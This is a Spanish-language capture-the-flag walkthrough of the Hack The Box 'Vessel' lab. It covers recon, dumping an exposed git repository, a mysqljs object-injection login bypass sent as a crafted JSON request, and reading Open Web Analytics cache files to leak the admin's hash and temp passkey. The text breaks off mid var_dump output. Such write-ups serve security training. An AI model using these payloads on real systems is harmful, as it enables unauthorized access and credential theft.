---
layout: post
title: Vessel
date: 2023-10-14
description:
img:
fig-caption:
tags: [OSCP]
---
___

<center><img src="/writeups/assets/img/Vessel-htb/Vessel.png" alt="" style="height: 394px; width:520px;"></center>

***

# Conocimientos



***

# Reconocimiento

## Escaneo de puertos con nmap

### Descubrimiento de puertos abiertos

```null
nmap -p- --open --min-rate 5000 -n -Pn 10.10.11.178 -oG openports
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-08 21:01 GMT
Nmap scan report for 10.10.11.178
Host is up (0.066s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 14.22 seconds
```

### Escaneo de versión y servicios de cada puerto

```null
nmap -sCV -p22,80 10.10.11.178 -oN portscan
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-08 21:01 GMT
Nmap scan report for 10.10.11.178
Host is up (0.063s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 38c297327b9ec565b44b4ea330a59aa5 (RSA)
|   256 33b355f4a17ff84e48dac5296313833d (ECDSA)
|_  256 a1f1881c3a397274e6301f28b680254e (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-trane-info: Problem with XML parsing of /evox/about
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Vessel
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.89 seconds
```

## Puerto 80 (HTTP)

Con ```whatweb``` analizo las tecnologías que emplea el servidor web

```null
whatweb http://10.10.11.178
http://10.10.11.178 [200 OK] Apache[2.4.41], Bootstrap, Country[RESERVED][ZZ], Email[name@example.com], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.10.11.178], Script, Title[Vessel], X-Powered-By[Express]
```

La página principal se ve así:

<img src="/writeups/assets/img/Vessel-htb/1.png" alt="">

Aparece el dominio al final del todo

<img src="/writeups/assets/img/Vessel-htb/2.png" alt="">

Lo añado al ```/etc/hosts```

Aplico fuzzing para descubrir rutas

```null
wfuzz -c --hh=26 -t 200 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-medium-directories-lowercase.txt http://vessel.htb/FUZZ
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://vessel.htb/FUZZ
Total requests: 26584

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                                         
=====================================================================

000000003:   302        0 L      4 W        28 Ch       "admin"                                                                                                                                         
000000009:   301        10 L     16 W       171 Ch      "js"                                                                                                                                            
000000038:   200        89 L     234 W      5830 Ch     "register"                                                                                                                                      
000000015:   301        10 L     16 W       173 Ch      "css"                                                                                                                                           
000000036:   302        0 L      4 W        28 Ch       "logout"                                                                                                                                        
000000045:   301        10 L     16 W       173 Ch      "img"                                                                                                                                           
000000039:   200        70 L     182 W      4213 Ch     "login"                                                                                                                                         
000000124:   301        10 L     16 W       173 Ch      "dev"                                                                                                                                           
000001866:   200        51 L     117 W      2335 Ch     "500"                                                                                                                                           
000003781:   403        9 L      28 W       275 Ch      "server-status"                                                                                                                                 
000003809:   200        243 L    871 W      15030 Ch    "http://vessel.htb/"                                                                                                                            
000004169:   200        63 L     177 W      3637 Ch     "reset"                                                                                                                                         
000004924:   200        52 L     120 W      2400 Ch     "401"                                                                                                                                           
000000183:   200        51 L     125 W      2393 Ch     "404"                                                                                                                                           

Total time: 0
Processed Requests: 26473
Filtered Requests: 26459
Requests/sec.: 0
```

Al intentar registrarme me aparece un error

<img src="/writeups/assets/img/Vessel-htb/3.png" alt="">

En ```/dev``` hay un repositorio GIT

```null
dirsearch -u http://10.10.11.178/dev

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10927

Output File: /root/.dirsearch/reports/10.10.11.178/-dev_23-04-08_21-14-14.txt

Error Log: /root/.dirsearch/logs/errors-23-04-08_21-14-14.log

Target: http://10.10.11.178/dev/

[21:14:14] Starting: 
[21:14:17] 200 -  139B  - /dev/.git/config
[21:14:17] 200 -   25B  - /dev/.git/COMMIT_EDITMSG
[21:14:17] 200 -   73B  - /dev/.git/description
[21:14:17] 200 -   23B  - /dev/.git/HEAD
[21:14:17] 301 -  203B  - /dev/.git/logs/refs  ->  /dev/.git/logs/refs/
[21:14:17] 301 -  215B  - /dev/.git/logs/refs/heads  ->  /dev/.git/logs/refs/heads/
[21:14:17] 200 -  240B  - /dev/.git/info/exclude
[21:14:17] 200 -    2KB - /dev/.git/logs/refs/heads/master
[21:14:17] 301 -  205B  - /dev/.git/refs/heads  ->  /dev/.git/refs/heads/
[21:14:17] 200 -   41B  - /dev/.git/refs/heads/master
[21:14:17] 301 -  203B  - /dev/.git/refs/tags  ->  /dev/.git/refs/tags/
[21:14:17] 200 -    5KB - /dev/.git/logs/HEAD
[21:14:17] 200 -    3KB - /dev/.git/index
```

Utilizo ```git-dumper``` para recomponerlo

```null
git-dumper http://10.10.11.178/dev/.git git
```

Tiene 3 commits. Puedo ver un usuario

```null
git log
commit 208167e785aae5b052a4a2f9843d74e733fbd917 (HEAD -> master)
Author: Ethan <ethan@vessel.htb>
Date:   Mon Aug 22 10:11:34 2022 -0400

    Potential security fixes

commit edb18f3e0cd9ee39769ff3951eeb799dd1d8517e
Author: Ethan <ethan@vessel.htb>
Date:   Fri Aug 12 14:19:19 2022 -0400

    Security Fixes

commit f1369cfecb4a3125ec4060f1a725ce4aa6cbecd3
Author: Ethan <ethan@vessel.htb>
Date:   Wed Aug 10 15:16:56 2022 -0400

    Initial commit
```

Listo los cambios realizados hasta el último commit

```null
git diff f1369cfecb4a3125ec4060f1a725ce4aa6cbecd3
diff --git a/routes/index.js b/routes/index.js
index be2adb1..69c22be 100644
--- a/routes/index.js
+++ b/routes/index.js
@@ -1,6 +1,6 @@
 var express = require('express');
 var router = express.Router();
-var mysql = require('mysql');
+var mysql = require('mysql'); /* Upgraded deprecated mysqljs */
 var flash = require('connect-flash');
 var db = require('../config/db.js');
 var connection = mysql.createConnection(db.db)
@@ -61,7 +61,7 @@ router.post('/api/login', function(req, res) {
        let username = req.body.username;
        let password = req.body.password;
        if (username && password) {
-               connection.query("SELECT * FROM accounts WHERE username = '" + username + "' AND password = '" + password + "'", function(error, results, fields) {
+               connection.query('SELECT * FROM accounts WHERE username = ? AND password = ?', [username, password], function(error, results, fields) {
                        if (error) throw error;
                        if (results.length > 0) {
                                req.session.loggedin = true;
```

```null
git diff edb18f3e0cd9ee39769ff3951eeb799dd1d8517e
diff --git a/routes/index.js b/routes/index.js
index 0cf479c..69c22be 100644
--- a/routes/index.js
+++ b/routes/index.js
@@ -1,6 +1,6 @@
 var express = require('express');
 var router = express.Router();
-var mysql = require('mysql');
+var mysql = require('mysql'); /* Upgraded deprecated mysqljs */
 var flash = require('connect-flash');
 var db = require('../config/db.js');
 var connection = mysql.createConnection(db.db)
```

El archivo ```db.js``` contiene credenciales de acceso a la base de datos

```null
var mysql = require('mysql');

var connection = {
        db: {
        host     : 'localhost',
        user     : 'default',
        password : 'daqvACHKvRn84VdVp',
        database : 'vessel'
}};

module.exports = connection;
```

En ```routes/index.js``` se hace referencia a ```mysqljs```

```null
var mysql = require('mysql'); /* Upgraded deprecated mysqljs */
```

Busco por vulnerabilidades a ello y encuentro un [artículo](https://flattsecurity.medium.com/finding-an-unseen-sql-injection-by-bypassing-escape-functions-in-mysqljs-mysql-90b27f6542b4) que detalla una SQLi. Intercepto la petición y me conecto como el usuario Administrador

```null
POST /api/login HTTP/1.1
Host: 10.10.11.178
Content-Length: 29
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://10.10.11.178
Content-Type: application/json
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://10.10.11.178/login
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: connect.sid=s%3A1GVp_IDFSbWmY1C9gVGUEaKIvXyGaicb.BqSgnwBPTCbkXq70O9zISe1Tv4Cx%2FdLKezWuXS%2FvaOs
Connection: close

{"username":"admin", "password":{"password": 1}}
```

Accedo a una nueva interfaz

<img src="/writeups/assets/img/Vessel-htb/4.png" alt="">

Puedo ver un nuevo subdominio ```openwebanalytics.vessel.htb```. Lo añado al ```/etc/hosts```. Corresponde a un nuevo panel de inicio de sesión

<img src="/writeups/assets/img/Vessel-htb/5.png" alt="">

Solicito una nueva contraseña para el usuario ```admin```

<img src="/writeups/assets/img/Vessel-htb/6.png" alt="">

En el código fuente se puede ver la versión del OWA

<img src="/writeups/assets/img/Vessel-htb/7.png" alt="">

Miro el repositorio de [Github](https://github.com/Open-Web-Analytics/Open-Web-Analytics/releases). En la siguiente actualización aparece un mensaje que advierte de una vulnerabilidad crítica

<img src="/writeups/assets/img/Vessel-htb/8.png" alt="">

Este [artículo](https://devel0pment.de/?p=2494) explica en que consiste la vulnerabilidad

<img src="/writeups/assets/img/Vessel-htb/9.png" alt="">

El directorio donde se almacena el archivo con contenido en PHP proveniente de mi input de data serializada en base64 está vacío

<img src="/writeups/assets/img/Vessel-htb/10.png" alt="">

<img src="/writeups/assets/img/Vessel-htb/11.png" alt="">

Clono el repositorio y migro al commit del release que está en producción, para analizar los scripts que se encargan de almacenar esta caché

```null
git clone https://github.com/Open-Web-Analytics/Open-Web-Analytics
git checkout 0eaa08bc7f07347df9ec17d3d92c16a88543a64b
```

Busco por todos aquellos cuyo nombre contenga la palabra caché

```null
find . | grep -i cache
./owa-data/caches
./owa-data/caches/index.php
./includes/memcached-client.php
./modules/base/classes/fileCache.php
./modules/base/classes/memcachedCache.php
./modules/base/classes/cache.php
./modules/base/flushCacheCli.php
./modules/base/optionsFlushCache.php
```

Analizo ```fileCache.php```. Es posible llegar a obtener el nombre del archivo final

```null
function putItemToCacheStore($collection, $id) {

    if ( $this->acquire_lock() ) {
        $this->makeCacheCollectionDir($collection);
        $this->debug(' writing file for: '.$collection.$id);
        // create collection dir
        $collection_dir = $this->makeCollectionDirPath($collection);
        // asemble cache file name
        $cache_file = $collection_dir.$id.'.php';
```

Esta variable se declara en este otro fragmento de código

```null
function makeCacheCollectionDir($collection) {

    // check to see if the caches directory is writable, return if not.
    if (!is_writable($this->cache_dir)) {
        return;
    }

    // localize the cache directory based on some id passed from caller

    if (!file_exists($this->cache_dir.$this->cache_id)) {

        mkdir($this->cache_dir.$this->cache_id);
        chmod($this->cache_dir.$this->cache_id, $this->dir_perms);
    }

    $collection_dir = $this->makeCollectionDirPath($collection);
```

La función comienza con una verificación para determinar si el directorio de caché es escribible. Si no lo es, la función no avanza. En caso contrario continúa localizando el directorio de caché en función de un ID proporcionado por el llamador.

A continuación, la función comprueba si el directorio específico de la colección $collection existe en el directorio de caché. Si no existe, se crea el directorio utilizando la función ```mkdir()``` y se le otorgan permisos utilizando la función ```chmod()```.

Finalmente, la función llama a otra función ```makeCollectionDirPath($collection)``` y retorna el valor devuelto por esta función en la variable ```$collection_dir```.

El ID se define en el script ```cache.php```, desde la función ```set()```

```null
function set($collection, $key, $value, $expires = '') {

    $hkey = $this->hash($key);
    owa_coreAPI::debug('set key: '.$key);
    owa_coreAPI::debug('set hkey: '.$hkey);
    $this->cache[$collection][$hkey] = $value;
    $this->debug(sprintf('Added Object to Cache - Collection: %s, id: %s', $collection, $hkey));
    $this->statistics['added']++;        
    $this->dirty_objs[$collection][$hkey] = $hkey;
    $this->dirty_collections[$collection] = true; 
    $this->debug(sprintf('Added Object to Dirty List - Collection: %s, id: %s', $collection, $hkey));
    $this->statistics['dirty']++;
        
}
```

Se va iterando por cada valor de ```dirt_objs``` y ```dirty_collections``` para asegurarse de que se actualicen en el almacenamiento persistente de la caché en un momento posterior. La función también actualiza las estadísticas correspondientes al uso de la caché. La key pasa a ser el identificador

En el script ```owa_entity.php``` se añade finalmente al caché. La función utiliza la función ```set()``` de la instancia de caché para agregar el objeto actual a la caché con la clave ```$col.$this->get('id')``` y el período de caducidad especificado en ```$this->getCacheExpirationPeriod()```.

```null
function addToCache($col = 'id') {
    
    if($this->isCachable()) {
        $cache = owa_coreAPI::cacheSingleton();
        $cache->setCollectionExpirationPeriod($this->getTableName(), $this->getCacheExpirationPeriod());
        $cache->set($this->getTableName(), $col.$this->get('id'), $this, $this->getCacheExpirationPeriod());
    }
}
```

Es decir, se están introduciendo dichos valores en una base de datos cuya tabla es el valor del ```$collection``` y ```$key``` el nombre de la columna. En la función ```getByColumn``` se realiza la conexión con la base de datos

```null
function getByColumn($col, $value) {
            
    if ( ! $col ) {
        throw new Exception("No column name passed.");
    }
    
    if ( ! $value ) {
        throw new Exception("No value passed.");
    }
    
    $cache_obj = '';
    
    if ($this->isCachable()) {
        $cache = owa_coreAPI::cacheSingleton();
        $cache->setCollectionExpirationPeriod($this->getTableName(), $this->getCacheExpirationPeriod());
        $cache_obj = $cache->get($this->getTableName(), $col.$value);
    }        
        
    if (!empty($cache_obj)) {
    
        $cache_obj_properties = $cache_obj->_getProperties();
        $this->setProperties($cache_obj_properties);
        $this->wasPersisted = true;
                
    } else {
    
        $db = owa_coreAPI::dbSingleton();
        $db->selectFrom($this->getTableName());
        $db->selectColumn('*');
        owa_coreAPI::debug("Col: $col, value: $value");    
        $db->where($col, $value);
        $properties = $db->getOneRow();
        
        if (!empty($properties)) {
            
            $this->setProperties($properties);
            $this->wasPersisted = true;
            // add to cache            
            $this->addToCache($col);
            owa_coreAPI::debug('entity loaded from db');        
        }
    } 
}
```

La siguiente sección de la función se encarga de verificar si el objeto está en la caché. Si es así, la función utiliza la función ```get()``` de la instancia de caché para recuperar el objeto con la clave correspondiente y establece las propiedades del objeto actual con los valores de la instancia de caché recuperada.

Si el objeto no se encuentra en la caché, la función utiliza la clase ```owa_coreAPI``` para realizar una consulta en la base de datos y obtener las propiedades correspondientes al objeto de la tabla de base de datos. Si se encuentra el objeto, la función establece las propiedades del objeto actual con los valores obtenidos de la base de datos y luego agrega el objeto a la caché mediante la función ```addToCache()```.

La función ```getUser()``` se encarga de validar el usuario al iniciar sesión, por lo que es muy probable que este valor se almacene en la caché durante un periodo de tiempo

```null
function getUser() {

    // fetch user object from the db
    $this->u = owa_coreAPI::entityFactory('base.user');
    $this->u->getByColumn('user_id', $this->credentials['user_id']);
}
```

Por tanto, el formato tiene que ser ```user_id``` seguido de un dígito. Computo el hash MD5 correspondiente

```null
echo -n "user_id1" | md5sum
c30da9265ba0a4704db9229f864c9eb7  -
```

Tras tratar de loggearme como ```admin:admin```, y utilizando el anterior identificador, es posible llegar obtener la data serializada de la conexión con la base de datos

```null
curl -s -X GET 'http://openwebanalytics.vessel.htb/owa-data/caches/1/owa_user/c30da9265ba0a4704db9229f864c9eb7.php'
<?php\n/*Tzo4OiJvd2FfdXNlciI6NTp7czo0OiJuYW1lIjtzOjk6ImJhc2UudXNlciI7czoxMDoicHJvcGVydGllcyI7YToxMDp7czoyOiJpZCI7TzoxMjoib3dhX2RiQ29sdW1uIjoxMTp7czo0OiJuYW1lIjtOO3M6NToidmFsdWUiO3M6MToiMSI7czo5OiJkYXRhX3R5cGUiO3M6NjoiU0VSSUFMIjtzOjExOiJmb3JlaWduX2tleSI7TjtzOjE0OiJpc19wcmltYXJ5X2tleSI7YjowO3M6MTQ6ImF1dG9faW5jcmVtZW50IjtiOjA7czo5OiJpc191bmlxdWUiO2I6MDtzOjExOiJpc19ub3RfbnVsbCI7YjowO3M6NToibGFiZWwiO047czo1OiJpbmRleCI7TjtzOjEzOiJkZWZhdWx0X3ZhbHVlIjtOO31zOjc6InVzZXJfaWQiO086MTI6Im93YV9kYkNvbHVtbiI6MTE6e3M6NDoibmFtZSI7TjtzOjU6InZhbHVlIjtzOjU6ImFkbWluIjtzOjk6ImRhdGFfdHlwZSI7czoxMjoiVkFSQ0hBUigyNTUpIjtzOjExOiJmb3JlaWduX2tleSI7TjtzOjE0OiJpc19wcmltYXJ5X2tleSI7YjoxO3M6MTQ6ImF1dG9faW5jcmVtZW50IjtiOjA7czo5OiJpc191bmlxdWUiO2I6MDtzOjExOiJpc19ub3RfbnVsbCI7YjowO3M6NToibGFiZWwiO047czo1OiJpbmRleCI7TjtzOjEzOiJkZWZhdWx0X3ZhbHVlIjtOO31zOjg6InBhc3N3b3JkIjtPOjEyOiJvd2FfZGJDb2x1bW4iOjExOntzOjQ6Im5hbWUiO047czo1OiJ2YWx1ZSI7czo2MDoiJDJ5JDEwJHpKTEJvU2RPaFdVS0VGL3YvMUVuOHVVM0tJWS9QdlA2WVYuTy9SRjcxMUZlbjRwczRRdmRPIjtzOjk6ImRhdGFfdHlwZSI7czoxMjoiVkFSQ0hBUigyNTUpIjtzOjExOiJmb3JlaWduX2tleSI7TjtzOjE0OiJpc19wcmltYXJ5X2tleSI7YjowO3M6MTQ6ImF1dG9faW5jcmVtZW50IjtiOjA7czo5OiJpc191bmlxdWUiO2I6MDtzOjExOiJpc19ub3RfbnVsbCI7YjowO3M6NToibGFiZWwiO047czo1OiJpbmRleCI7TjtzOjEzOiJkZWZhdWx0X3ZhbHVlIjtOO31zOjQ6InJvbGUiO086MTI6Im93YV9kYkNvbHVtbiI6MTE6e3M6NDoibmFtZSI7TjtzOjU6InZhbHVlIjtzOjU6ImFkbWluIjtzOjk6ImRhdGFfdHlwZSI7czoxMjoiVkFSQ0hBUigyNTUpIjtzOjExOiJmb3JlaWduX2tleSI7TjtzOjE0OiJpc19wcmltYXJ5X2tleSI7YjowO3M6MTQ6ImF1dG9faW5jcmVtZW50IjtiOjA7czo5OiJpc191bmlxdWUiO2I6MDtzOjExOiJpc19ub3RfbnVsbCI7YjowO3M6NToibGFiZWwiO047czo1OiJpbmRleCI7TjtzOjEzOiJkZWZhdWx0X3ZhbHVlIjtOO31zOjk6InJlYWxfbmFtZSI7TzoxMjoib3dhX2RiQ29sdW1uIjoxMTp7czo0OiJuYW1lIjtOO3M6NToidmFsdWUiO3M6MTM6ImRlZmF1bHQgYWRtaW4iO3M6OToiZGF0YV90eXBlIjtzOjEyOiJWQVJDSEFSKDI1NSkiO3M6MTE6ImZvcmVpZ25fa2V5IjtOO3M6MTQ6ImlzX3ByaW1hcnlfa2V5IjtiOjA7czoxNDoiYXV0b19pbmNyZW1lbnQiO2I6MDtzOjk6ImlzX3VuaXF1ZSI7YjowO3M6MTE6ImlzX25vdF9udWxsIjtiOjA7czo1OiJsYWJlbCI7TjtzOjU6ImluZGV4IjtOO3M6MTM6ImRlZmF1bHRfdmFsdWUiO047fXM6MTM6ImVtYWlsX2FkZHJlc3MiO086MTI6Im93YV9kYkNvbHVtbiI6MTE6e3M6NDoibmFtZSI7TjtzOjU6InZhbHVlIjtzOjE2OiJhZG1pbkB2ZXNzZWwuaHRiIjtzOjk6ImRhdGFfdHlwZSI7czoxMjoiVkFSQ0hBUigyNTUpIjtzOjExOiJmb3JlaWduX2tleSI7TjtzOjE0OiJpc19wcmltYXJ5X2tleSI7YjowO3M6MTQ6ImF1dG9faW5jcmVtZW50IjtiOjA7czo5OiJpc191bmlxdWUiO2I6MDtzOjExOiJpc19ub3RfbnVsbCI7YjowO3M6NToibGFiZWwiO047czo1OiJpbmRleCI7TjtzOjEzOiJkZWZhdWx0X3ZhbHVlIjtOO31zOjEyOiJ0ZW1wX3Bhc3NrZXkiO086MTI6Im93YV9kYkNvbHVtbiI6MTE6e3M6NDoibmFtZSI7TjtzOjU6InZhbHVlIjtzOjMyOiI0MmQwZTAxMzFlNTA3MDc2NWNlZGQ1OTk1MThlOTNlYyI7czo5OiJkYXRhX3R5cGUiO3M6MTI6IlZBUkNIQVIoMjU1KSI7czoxMToiZm9yZWlnbl9rZXkiO047czoxNDoiaXNfcHJpbWFyeV9rZXkiO2I6MDtzOjE0OiJhdXRvX2luY3JlbWVudCI7YjowO3M6OToiaXNfdW5pcXVlIjtiOjA7czoxMToiaXNfbm90X251bGwiO2I6MDtzOjU6ImxhYmVsIjtOO3M6NToiaW5kZXgiO047czoxMzoiZGVmYXVsdF92YWx1ZSI7Tjt9czoxMzoiY3JlYXRpb25fZGF0ZSI7TzoxMjoib3dhX2RiQ29sdW1uIjoxMTp7czo0OiJuYW1lIjtOO3M6NToidmFsdWUiO3M6MTA6IjE2NTAyMTE2NTkiO3M6OToiZGF0YV90eXBlIjtzOjY6IkJJR0lOVCI7czoxMToiZm9yZWlnbl9rZXkiO047czoxNDoiaXNfcHJpbWFyeV9rZXkiO2I6MDtzOjE0OiJhdXRvX2luY3JlbWVudCI7YjowO3M6OToiaXNfdW5pcXVlIjtiOjA7czoxMToiaXNfbm90X251bGwiO2I6MDtzOjU6ImxhYmVsIjtOO3M6NToiaW5kZXgiO047czoxMzoiZGVmYXVsdF92YWx1ZSI7Tjt9czoxNjoibGFzdF91cGRhdGVfZGF0ZSI7TzoxMjoib3dhX2RiQ29sdW1uIjoxMTp7czo0OiJuYW1lIjtOO3M6NToidmFsdWUiO3M6MTA6IjE2NTAyMTE2NTkiO3M6OToiZGF0YV90eXBlIjtzOjY6IkJJR0lOVCI7czoxMToiZm9yZWlnbl9rZXkiO047czoxNDoiaXNfcHJpbWFyeV9rZXkiO2I6MDtzOjE0OiJhdXRvX2luY3JlbWVudCI7YjowO3M6OToiaXNfdW5pcXVlIjtiOjA7czoxMToiaXNfbm90X251bGwiO2I6MDtzOjU6ImxhYmVsIjtOO3M6NToiaW5kZXgiO047czoxMzoiZGVmYXVsdF92YWx1ZSI7Tjt9czo3OiJhcGlfa2V5IjtPOjEyOiJvd2FfZGJDb2x1bW4iOjExOntzOjQ6Im5hbWUiO3M6NzoiYXBpX2tleSI7czo1OiJ2YWx1ZSI7czozMjoiYTM5MGNjMDI0N2VjYWRhOWEyYjhkMjMzOGI5Y2E2ZDIiO3M6OToiZGF0YV90eXBlIjtzOjEyOiJWQVJDSEFSKDI1NSkiO3M6MTE6ImZvcmVpZ25fa2V5IjtOO3M6MTQ6ImlzX3ByaW1hcnlfa2V5IjtiOjA7czoxNDoiYXV0b19pbmNyZW1lbnQiO2I6MDtzOjk6ImlzX3VuaXF1ZSI7YjowO3M6MTE6ImlzX25vdF9udWxsIjtiOjA7czo1OiJsYWJlbCI7TjtzOjU6ImluZGV4IjtOO3M6MTM6ImRlZmF1bHRfdmFsdWUiO047fX1zOjE2OiJfdGFibGVQcm9wZXJ0aWVzIjthOjQ6e3M6NToiYWxpYXMiO3M6NDoidXNlciI7czo0OiJuYW1lIjtzOjg6Im93YV91c2VyIjtzOjk6ImNhY2hlYWJsZSI7YjoxO3M6MjM6ImNhY2hlX2V4cGlyYXRpb25fcGVyaW9kIjtpOjYwNDgwMDt9czoxMjoid2FzUGVyc2lzdGVkIjtiOjE7czo1OiJjYWNoZSI7Tjt9*/\n?>
```

Está en base64, le hago el decode

```null
cat data | base64 -d
O:8:"owa_user":5:{s:4:"name";s:9:"base.user";s:10:"properties";a:10:{s:2:"id";O:12:"owa_dbColumn":11:{s:4:"name";N;s:5:"value";s:1:"1";s:9:"data_type";s:6:"SERIAL";s:11:"foreign_key";N;s:14:"is_primary_key";b:0;s:14:"auto_increment";b:0;s:9:"is_unique";b:0;s:11:"is_not_null";b:0;s:5:"label";N;s:5:"index";N;s:13:"default_value";N;}s:7:"user_id";O:12:"owa_dbColumn":11:{s:4:"name";N;s:5:"value";s:5:"admin";s:9:"data_type";s:12:"VARCHAR(255)";s:11:"foreign_key";N;s:14:"is_primary_key";b:1;s:14:"auto_increment";b:0;s:9:"is_unique";b:0;s:11:"is_not_null";b:0;s:5:"label";N;s:5:"index";N;s:13:"default_value";N;}s:8:"password";O:12:"owa_dbColumn":11:{s:4:"name";N;s:5:"value";s:60:"$2y$10$zJLBoSdOhWUKEF/v/1En8uU3KIY/PvP6YV.O/RF711Fen4ps4QvdO";s:9:"data_type";s:12:"VARCHAR(255)";s:11:"foreign_key";N;s:14:"is_primary_key";b:0;s:14:"auto_increment";b:0;s:9:"is_unique";b:0;s:11:"is_not_null";b:0;s:5:"label";N;s:5:"index";N;s:13:"default_value";N;}s:4:"role";O:12:"owa_dbColumn":11:{s:4:"name";N;s:5:"value";s:5:"admin";s:9:"data_type";s:12:"VARCHAR(255)";s:11:"foreign_key";N;s:14:"is_primary_key";b:0;s:14:"auto_increment";b:0;s:9:"is_unique";b:0;s:11:"is_not_null";b:0;s:5:"label";N;s:5:"index";N;s:13:"default_value";N;}s:9:"real_name";O:12:"owa_dbColumn":11:{s:4:"name";N;s:5:"value";s:13:"default admin";s:9:"data_type";s:12:"VARCHAR(255)";s:11:"foreign_key";N;s:14:"is_primary_key";b:0;s:14:"auto_increment";b:0;s:9:"is_unique";b:0;s:11:"is_not_null";b:0;s:5:"label";N;s:5:"index";N;s:13:"default_value";N;}s:13:"email_address";O:12:"owa_dbColumn":11:{s:4:"name";N;s:5:"value";s:16:"admin@vessel.htb";s:9:"data_type";s:12:"VARCHAR(255)";s:11:"foreign_key";N;s:14:"is_primary_key";b:0;s:14:"auto_increment";b:0;s:9:"is_unique";b:0;s:11:"is_not_null";b:0;s:5:"label";N;s:5:"index";N;s:13:"default_value";N;}s:12:"temp_passkey";O:12:"owa_dbColumn":11:{s:4:"name";N;s:5:"value";s:32:"42d0e0131e5070765cedd599518e93ec";s:9:"data_type";s:12:"VARCHAR(255)";s:11:"foreign_key";N;s:14:"is_primary_key";b:0;s:14:"auto_increment";b:0;s:9:"is_unique";b:0;s:11:"is_not_null";b:0;s:5:"label";N;s:5:"index";N;s:13:"default_value";N;}s:13:"creation_date";O:12:"owa_dbColumn":11:{s:4:"name";N;s:5:"value";s:10:"1650211659";s:9:"data_type";s:6:"BIGINT";s:11:"foreign_key";N;s:14:"is_primary_key";b:0;s:14:"auto_increment";b:0;s:9:"is_unique";b:0;s:11:"is_not_null";b:0;s:5:"label";N;s:5:"index";N;s:13:"default_value";N;}s:16:"last_update_date";O:12:"owa_dbColumn":11:{s:4:"name";N;s:5:"value";s:10:"1650211659";s:9:"data_type";s:6:"BIGINT";s:11:"foreign_key";N;s:14:"is_primary_key";b:0;s:14:"auto_increment";b:0;s:9:"is_unique";b:0;s:11:"is_not_null";b:0;s:5:"label";N;s:5:"index";N;s:13:"default_value";N;}s:7:"api_key";O:12:"owa_dbColumn":11:{s:4:"name";s:7:"api_key";s:5:"value";s:32:"a390cc0247ecada9a2b8d2338b9ca6d2";s:9:"data_type";s:12:"VARCHAR(255)";s:11:"foreign_key";N;s:14:"is_primary_key";b:0;s:14:"auto_increment";b:0;s:9:"is_unique";b:0;s:11:"is_not_null";b:0;s:5:"label";N;s:5:"index";N;s:13:"default_value";N;}}s:16:"_tableProperties";a:4:{s:5:"alias";s:4:"user";s:4:"name";s:8:"owa_user";s:9:"cacheable";b:1;s:23:"cache_expiration_period";i:604800;}s:12:"wasPersisted";b:1;s:5:"cache";N;}
```

Deserializo la data con PHP

```null
php > var_dump($data);
object(__PHP_Incomplete_Class)#1 (6) {
  ["__PHP_Incomplete_Class_Name"]=>
  string(8) "owa_user"
  ["name"]=>
  string(9) "base.user"
  ["properties"]=>
  array(10) {
    ["id"]=>
    object(__PHP_Incomplete_Class)#2 (12) {
      ["__PHP_Incomplete_Class_Name"]=>
      string(12) "owa_dbColumn"
      ["name"]=>
      NULL
      ["value"]=>
      string(1) "1"
      ["data_type"]=>
      string(6) "SERIAL"
      ["foreign_key"]=>
      NULL
      ["is_primary_key"]=>
      bool(false)
      ["auto_increment"]=>
      bool(false)
      ["is_unique"]=>
      bool(false)
      ["is_not_null"]=>
      bool(false)
      ["label"]=>
      NULL
      ["index"]=>
      NULL
      ["default_value"]=>
      NULL
    }
    ["user_id"]=>
    object(__PHP_Incomplete_Class)#3 (12) {
      ["__PHP_Incomplete_Class_Name"]=>
      string(12) "owa_dbColumn"
      ["name"]=>
      NULL
      ["value"]=>
      string(5) "admin"
      ["data_type"]=>
      string(12) "VARCHAR(255)"
      ["foreign_key"]=>
      NULL
      ["is_primary_key"]=>
      bool(true)
      ["auto_increment"]=>
      bool(false)
      ["is_unique"]=>
      bool(false)
      ["is_not_null"]=>
      bool(false)
      ["label"]=>
      NULL
      ["index"]=>
      NULL
      ["default_value"]=>
      NULL
    }
    ["password"]=>
    object(__PHP_Incomplete_Class)#4 (12) {
      ["__PHP_Incomplete_Class_Name"]=>
      string(12) "owa_dbColumn"
      ["name"]=>
      NULL
      ["value"]=>
      string(60) "$2y$10$zJLBoSdOhWUKEF/v/1En8uU3KIY/PvP6YV.O/RF711Fen4ps4QvdO"
      ["data_type"]=>
      string(12) "VARCHAR(255)"
      ["foreign_key"]=>
      NULL
      ["is_primary_key"]=>
      bool(false)
      ["auto_increment"]=>
      bool(false)
      ["is_unique"]=>
      bool(false)
      ["is_not_null"]=>
      bool(false)
      ["label"]=>
      NULL
      ["index"]=>
      NULL
      ["default_value"]=>
      NULL
    }
    ["role"]=>
    object(__PHP_Incomplete_Class)#5 (12) {
      ["__PHP_Incomplete_Class_Name"]=>
      string(12) "owa_dbColumn"
      ["name"]=>
      NULL
      ["value"]=>
      string(5) "admin"
      ["data_type"]=>
      string(12) "VARCHAR(255)"
      ["foreign_key"]=>
      NULL
      ["is_primary_key"]=>
      bool(false)
      ["auto_increment"]=>
